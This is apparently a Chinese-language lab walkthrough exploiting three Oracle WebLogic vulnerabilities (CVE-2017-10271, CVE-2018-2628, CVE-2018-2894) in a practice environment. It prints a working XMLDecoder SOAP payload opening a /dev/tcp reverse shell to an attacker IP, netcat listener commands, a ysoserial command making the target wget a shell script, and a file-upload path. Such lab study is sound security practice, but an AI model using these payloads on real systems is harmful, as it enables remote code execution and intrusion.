##### CVE-2017-10271 XMLDecoder反序列化

进入靶场

![](https://image.3001.net/images/20220908/1662638159_6319d84fb9cc3e60f13a3.png!small)

点击链接，抓包，变更post请求方式，构造poc

    
    
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
    <void index="0">
    <string>/bin/bash</string>
    </void>
    <void index="1">
    <string>-c</string>
    </void>
    <void index="2">
    <string>bash -i &ampgt&ampamp /dev/tcp/192.168.103.134/4444 0&ampgt&ampamp1</string>
    </void>
    </array>
    <void method="start"/></void>
    </java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    

反弹shell

    
    
    python2 -m SimpleHTTPServer 80
    nc -nvlp 4444
    

将数据包传至重发模块，点击发送

![](https://image.3001.net/images/20220908/1662638187_6319d86b3fdb668f4901b.png!small)

注：报错415，需要修改Content-Type:text/xml;charset=utf-8

成功反弹shell

![](https://image.3001.net/images/20220908/1662638202_6319d87a4fe7f6deda6b5.png!small)

##### cve-2018-2628 反序列化

攻击机ip：192.168.103.134

靶机ip：192.168.103.112

启动靶场

![](https://image.3001.net/images/20220908/1662638248_6319d8a8df39cc2689b3c.png!small)

创建shell.sh文件准备反弹shell

![](https://image.3001.net/images/20220908/1662638266_6319d8ba011b6267b9f9f.png!small)

开启http服务

![](https://image.3001.net/images/20220908/1662638278_6319d8c6e6c67a3cf4087.png!small)

开启JRMPListener

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'wget 192.168.103.134/shell.sh'
    

![](https://image.3001.net/images/20220908/1662638292_6319d8d4b4085a02f6ce2.png!small)

执行poc脚本

    
    
    python2 exploit.py 192.168.103.112 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.103.134 1099 JRMPClient
    

![](https://image.3001.net/images/20220908/1662638304_6319d8e07efac8a7652bd.png!small)  
成功下载shell.sh

![](https://image.3001.net/images/20220908/1662638316_6319d8ec2927fe30c21ad.png!small)

开启监听端口

![](https://image.3001.net/images/20220908/1662638326_6319d8f6c6259c327dc85.png!small)

再次执行JRMPListener和poc脚本反弹shell

![](https://image.3001.net/images/20220908/1662638341_6319d905e94c331ff5157.png!small)

![](https://image.3001.net/images/20220908/1662638353_6319d911f15d2d6528825.png!small)

成功反弹

![](https://image.3001.net/images/20220908/1662638367_6319d91fafb46c615cc83.png!small)

##### cve-2018-2894 文件上传

进入靶场，找到漏洞利用点，修改工作路径

    
    
    /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
    

![](https://image.3001.net/images/20220908/1662638383_6319d92f48eac50e5632f.png!small)

bp抓包，传至重发模块发送，可以发现时间戳

![](https://image.3001.net/images/20220908/1662638404_6319d94404038bad1feb4.png!small)  
访问路径，上传成功

    
    
    路径  http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]
    

![](https://image.3001.net/images/20220908/1662638419_6319d953c48f674cec159.png!small)

